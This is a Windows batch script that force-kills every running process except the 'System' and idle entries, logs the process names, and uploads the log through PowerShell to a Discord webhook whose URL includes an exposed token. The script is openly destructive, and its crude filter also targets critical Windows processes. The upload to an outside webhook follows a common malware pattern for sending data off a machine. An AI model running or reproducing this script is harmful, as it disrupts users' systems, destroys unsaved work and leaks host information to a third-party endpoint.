@echo off
setlocal enabledelayedexpansion

set "log_file=terminated_processes.txt"
echo Terminating all non-system EXE applications... > "%log_file%"

rem Get the list of all processes excluding system processes
for /f "tokens=1,2" %%i in ('tasklist /FO CSV ^| findstr /V "System Idle Process,System"') do (
    set "process_name=%%~nxi"
    echo Terminating process: !process_name! >> "%log_file%"
    taskkill /F /IM "!process_name!" >nul 2>&1
)

rem Send the log file to Discord webhook
powershell -Command "Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1269102396621983889/wcS8DDGkbmQxPkq0i2VAs3GTgUV3SL06wFUVquMWB8l6_y4ZjqpCfIm93BYZxyG6FtrN' -Method Post -InFile '%log_file%' -ContentType 'application/octet-stream'"

echo All non-system EXE applications have been terminated.
endlocal
